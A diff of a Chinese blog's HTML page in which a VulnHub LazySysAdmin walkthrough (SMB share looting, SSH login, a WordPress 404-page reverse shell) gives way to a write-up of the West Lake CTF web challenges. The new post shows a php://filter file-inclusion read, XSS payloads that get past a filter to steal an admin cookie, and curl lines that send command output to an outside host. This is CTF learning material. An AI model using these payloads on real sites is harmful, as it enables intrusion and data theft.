@@ -108,38 +108,25 @@
 
 
 
-  <meta name="description" content="主要考察信息收集">
-<meta name="keywords" content="Web,CTF,Linux">
+  <meta name="description" content="西湖论剑预选赛 Web部分题目解析">
+<meta name="keywords" content="Web">
 <meta property="og:type" content="article">
-<meta property="og:title" content="VulnHub-LazySysAdmin">
-<meta property="og:url" content="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/index.html">
+<meta property="og:title" content="西湖论剑预选赛 Web题目解析">
+<meta property="og:url" content="http://yoursite.com/2019/04/11/西湖论剑Web/index.html">
 <meta property="og:site_name" content="Noel&#39;s Blog">
-<meta property="og:description" content="主要考察信息收集">
+<meta property="og:description" content="西湖论剑预选赛 Web部分题目解析">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/01.png">
-<meta property="og:image" content="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/02.png">
-<meta property="og:image" content="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/03.png">
-<meta property="og:image" content="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/04.png">
-<meta property="og:image" content="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/05.png">
-<meta property="og:image" content="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/06.png">
-<meta property="og:image" content="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/07.png">
-<meta property="og:image" content="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/00.png">
-<meta property="og:image" content="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/08.png">
-<meta property="og:image" content="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/09.png">
-<meta property="og:image" content="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/10.png">
-<meta property="og:image" content="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/11.png">
-<meta property="og:updated_time" content="2018-10-05T16:51:18.004Z">
+<meta property="og:updated_time" content="2019-04-11T09:33:11.274Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="VulnHub-LazySysAdmin">
-<meta name="twitter:description" content="主要考察信息收集">
-<meta name="twitter:image" content="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/01.png">
+<meta name="twitter:title" content="西湖论剑预选赛 Web题目解析">
+<meta name="twitter:description" content="西湖论剑预选赛 Web部分题目解析">
 
 
 
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/"/>
+  <link rel="canonical" href="http://yoursite.com/2019/04/11/西湖论剑Web/"/>
 
 
 
@@ -149,7 +136,7 @@
   };
 </script>
 
-  <title>VulnHub-LazySysAdmin | Noel's Blog</title>
+  <title>西湖论剑预选赛 Web题目解析 | Noel's Blog</title>
   
 
 
@@ -310,7 +297,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/11/西湖论剑Web/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Noel">
@@ -327,7 +314,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">VulnHub-LazySysAdmin
+          <h1 class="post-title" itemprop="name headline">西湖论剑预选赛 Web题目解析
               
             
           </h1>
@@ -352,24 +339,12 @@
                 
               
 
-              <time title="创建时间：2018-10-05 00:00:00" itemprop="dateCreated datePublished" datetime="2018-10-05T00:00:00+08:00">2018-10-05</time>
+              <time title="创建时间：2019-04-11 00:00:00 / 修改时间：17:33:11" itemprop="dateCreated datePublished" datetime="2019-04-11T00:00:00+08:00">2019-04-11</time>
             
 
             
               
 
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2018-10-06 00:51:18" itemprop="dateModified" datetime="2018-10-06T00:51:18+08:00">2018-10-06</time>
               
             
           </span>
@@ -386,7 +361,7 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Challenge/" itemprop="url" rel="index"><span itemprop="name">Challenge</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
 
                 
                 
@@ -428,44 +403,20 @@
       
 
       
-        <p>主要考察信息收集<br><a id="more"></a></p>
-<h2 id="0x01-前期试探"><a href="#0x01-前期试探" class="headerlink" title="0x01 前期试探"></a>0x01 前期试探</h2><p>使用nmap进行扫描,发现存在如下端口<br><img src="/2018/10/05/VulnHub-LazySysAdmin/01.png" alt=""></p>
-<p>可以做出简单的分析</p>
-<table>
-<thead>
-<tr>
-<th>端口</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>22</td>
-<td>SSH登陆</td>
-</tr>
-<tr>
-<td>80</td>
-<td>Web应用</td>
-</tr>
-<tr>
-<td>445</td>
-<td>共享文件</td>
-</tr>
-<tr>
-<td>3306</td>
-<td>MySql</td>
-</tr>
-</tbody>
-</table>
-<p>使用御剑扫描下Web应用<br><img src="/2018/10/05/VulnHub-LazySysAdmin/02.png" alt=""><br>存在PHPMyAdmin与WordPress，和robots.txt文件<br>robots.txt<br><img src="/2018/10/05/VulnHub-LazySysAdmin/03.png" alt=""><br>访问后发现没有多大用处,phpmyadmin与wordpress没有账号密码也并不好突破，<br>不过在wordpress处获得了一个可能的账号<br>togie<br><img src="/2018/10/05/VulnHub-LazySysAdmin/04.png" alt=""></p>
-<h2 id="0x02-突破点Find"><a href="#0x02-突破点Find" class="headerlink" title="0x02 突破点Find"></a>0x02 突破点Find</h2><p>因为其开放了445端口，所以用enum4linux尝试进行扫描<br><img src="/2018/10/05/VulnHub-LazySysAdmin/05.png" alt=""><br>可以看到share是OK的</p>
-<p>windows下获取共享资源<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use k: \\10.10.10.132\share$</span><br></pre></td></tr></table></figure></p>
-<p>linux下获取共享资源<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t cifs -o username=<span class="string">''</span>,password=<span class="string">''</span> //10.10.10.132/share$ /mnt</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2018/10/05/VulnHub-LazySysAdmin/06.png" alt=""><br>对得到文件进行查看<br>在deets.txt文件中发现一个密码<br><img src="/2018/10/05/VulnHub-LazySysAdmin/07.png" alt=""></p>
-<p>再加上刚开始得到的一个可能的账号，首先尝试了下ssh连接<br>没想到直接成功了,切换到root账户，完成<br><img src="/2018/10/05/VulnHub-LazySysAdmin/00.png" alt=""></p>
-<h2 id="0x03-Web渗透"><a href="#0x03-Web渗透" class="headerlink" title="0x03 Web渗透"></a>0x03 Web渗透</h2><h3 id="0x01-WebShell"><a href="#0x01-WebShell" class="headerlink" title="0x01 WebShell"></a>0x01 WebShell</h3><p>这样就直接拿到Shell了？多少有些无趣，看了下wordpress的config文件<br>找到了数据库的账号和密码<br><img src="/2018/10/05/VulnHub-LazySysAdmin/08.png" alt=""><br>记得刚才扫的有phpmyadmin目录，登陆成功，不过权限太低了，只好放弃<br><img src="/2018/10/05/VulnHub-LazySysAdmin/09.png" alt=""><br>尝试下登陆wordpress,没想到还是数据库的账号密码登陆上去了<br>在404界面写入反弹shell<br><img src="/2018/10/05/VulnHub-LazySysAdmin/10.png" alt=""><br>得到WebShell<br><img src="/2018/10/05/VulnHub-LazySysAdmin/11.png" alt=""></p>
-<h3 id="0x02-提权"><a href="#0x02-提权" class="headerlink" title="0x02 提权"></a>0x02 提权</h3><p>开坑待填……</p>
-<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>总的来说是一个比较简单的challange,基本上只要掌握了enum4linux以及获取共享资源的方法就可以，<br>继续加油。</p>
+        <p><font color="green">西湖论剑预选赛 Web部分题目解析</font><br><a id="more"></a></p>
+<h3 id="babyt3"><a href="#babyt3" class="headerlink" title="babyt3"></a><font color="dark">babyt3</font></h3><p>签到题，题目首先给出提示<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> $_GET[<span class="string">'file'</span>]</span><br></pre></td></tr></table></figure></p>
+<p>在参数上加上file,则会获得下一个提示<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include $_GET['file']</span><br><span class="line">&lt;!--hint: ZGlyLnBocA== --&gt;</span><br></pre></td></tr></table></figure></p>
+<p>解密后是dir.php<br>使用php伪协议包含获取dir.php里的内容<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">http://61.164.47.198:10000/?<span class="title">file</span>=<span class="title">php</span>://<span class="title">filter</span>/<span class="title">read</span>=<span class="title">convert.base64</span>-<span class="title">encode</span>/<span class="title">resource</span>=./<span class="title">dir.php</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">HTTP</span>/1.1 200 <span class="title">OK</span></span></span><br><span class="line"><span class="function"><span class="title">Date</span>: <span class="title">Thu</span>, 11 <span class="title">Apr</span> 2019 08:04:12 <span class="title">GMT</span></span></span><br><span class="line"><span class="function"><span class="title">Server</span>: <span class="title">Apache</span>/2.4.18 (<span class="title">Ubuntu</span>)</span></span><br><span class="line"><span class="function"><span class="title">Vary</span>: <span class="title">Accept</span>-<span class="title">Encoding</span></span></span><br><span class="line"><span class="function"><span class="title">Content</span>-<span class="title">Length</span>: 149</span></span><br><span class="line"><span class="function"><span class="title">Connection</span>: <span class="title">close</span></span></span><br><span class="line"><span class="function"><span class="title">Content</span>-<span class="title">Type</span>: <span class="title">text</span>/<span class="title">html</span>; <span class="title">charset</span>=<span class="title">UTF</span>-8</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">include</span> $<span class="title">_GET</span>['<span class="title">file</span>']<span class="title">PD9waHAKJGEgPSBAJF9HRVRbJ2RpciddOwppZighJGEpewokYSA9ICcvdG1wJzsKfQp2YXJfZHVtcChzY2FuZGlyKCRhKSk7Cg</span>==</span></span><br><span class="line"><span class="function">&lt;!--<span class="title">hint</span>: <span class="title">ZGlyLnBocA</span>== --&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>解密<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = @$_GET[<span class="string">'dir'</span>];</span><br><span class="line"><span class="keyword">if</span>(!$a)&#123;</span><br><span class="line">$a = <span class="string">'/tmp'</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(scandir($a));</span><br></pre></td></tr></table></figure></p>
+<p>遍历后发现flag在根目录下，直接读取</p>
+<h3 id="BreakOut"><a href="#BreakOut" class="headerlink" title="BreakOut"></a><font color="dark">BreakOut</font></h3><p>随便输入账号密码登陆<br>登陆后是一个留言界面，可以像管理员报告漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">如果你发现了该站点的bug,请将页面的URL提交给管理员,管理员会加上用户的token去登陆查验。</span><br><span class="line"></span><br><span class="line">感谢您的配合、</span><br></pre></td></tr></table></figure></p>
+<p>之后执行代码界面需要管理员权限，很显然是XSS打管理员Cookie然后命令执行了<br>存在过滤，可以使用<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span></span></span><br><span class="line"><span class="tag">=<span class="string">alert(1)/</span>&gt;</span></span><br><span class="line">或者</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1);</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>执行命令的时候采用HTTP盲注入<br>用ceye平台<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://***/`ls /|grep flag` #找到带flag的文件</span><br><span class="line">curl http://***/`cat flag`</span><br></pre></td></tr></table></figure></p>
+<h3 id="猜猜flag是什么"><a href="#猜猜flag是什么" class="headerlink" title="猜猜flag是什么"></a><font color="dark">猜猜flag是什么</font></h3><p>懒得写了，休息休息</p>
+<h3 id="？？"><a href="#？？" class="headerlink" title="？？"></a><font color="dark">？？</font></h3><p>懒得写了，休息休息</p>
+<blockquote>
+<p>你是我患得患失的梦，我是你可有可无的人。</p>
+</blockquote>
 
       
     </div>
@@ -488,10 +439,6 @@
           
             <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
           
-            <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
-          
-            <a href="/tags/Linux/" rel="tag"><i class="fa fa-tag"></i> Linux</a>
-          
         </div>
       
 
@@ -503,8 +450,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/10/05/PHPSHE1-5漏洞分析/" rel="next" title="PHPSHE1.5漏洞分析">
-                <i class="fa fa-chevron-left"></i> PHPSHE1.5漏洞分析
+              <a href="/2019/04/10/SourceLeakHacker plus/" rel="next" title="文件泄露扫描">
+                <i class="fa fa-chevron-left"></i> 文件泄露扫描
               </a>
             
           </div>
@@ -512,10 +459,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/10/05/Vulnhub-JJS-CTF/" rel="prev" title="Vulnhub JJS-CTF">
-                Vulnhub JJS-CTF <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -725,7 +668,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-前期试探"><span class="nav-number">1.</span> <span class="nav-text">0x01 前期试探</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-突破点Find"><span class="nav-number">2.</span> <span class="nav-text">0x02 突破点Find</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Web渗透"><span class="nav-number">3.</span> <span class="nav-text">0x03 Web渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-WebShell"><span class="nav-number">3.1.</span> <span class="nav-text">0x01 WebShell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-提权"><span class="nav-number">3.2.</span> <span class="nav-text">0x02 提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-总结"><span class="nav-number">4.</span> <span class="nav-text">0x04 总结</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#babyt3"><span class="nav-number">1.</span> <span class="nav-text">babyt3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BreakOut"><span class="nav-number">2.</span> <span class="nav-text">BreakOut</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#猜猜flag是什么"><span class="nav-number">3.</span> <span class="nav-text">猜猜flag是什么</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#？？"><span class="nav-number">4.</span> <span class="nav-text">？？</span></a></li></ol></div>
             
 
           </div>
